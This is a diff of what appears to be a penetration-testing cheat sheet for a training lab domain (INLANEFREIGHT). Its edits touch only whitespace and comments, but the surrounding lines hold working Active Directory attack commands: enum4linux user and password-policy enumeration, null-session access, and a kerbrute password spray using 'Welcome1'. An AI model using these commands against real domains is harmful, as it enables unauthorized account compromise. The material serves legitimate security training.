@@ -621,10 +621,9 @@ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 
 #Enum4linux Password Policy
 enum4linux -P 172.16.5.5 (DC)
 enum4linux-ng -P 172.16.5.5 -oA ilfreight
+
 #Enum user null session
 enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
-
-
 
 #Enumerating Null Session from Windows
 net use \\DC01\ipc$ "" /u:""
@@ -655,8 +654,10 @@ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclas
 # Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
 
 # Create a list of user first: crackmapexec smb 172.16.7.50 -u ad.account -p password --users > ad_groups-list.txt
+
 # parse it: $cat user-ad-list.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee valid_users.txt
 
+#Password Spray a list of users with a common password.
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
 
 #Use Kerburte and jsmith.txt
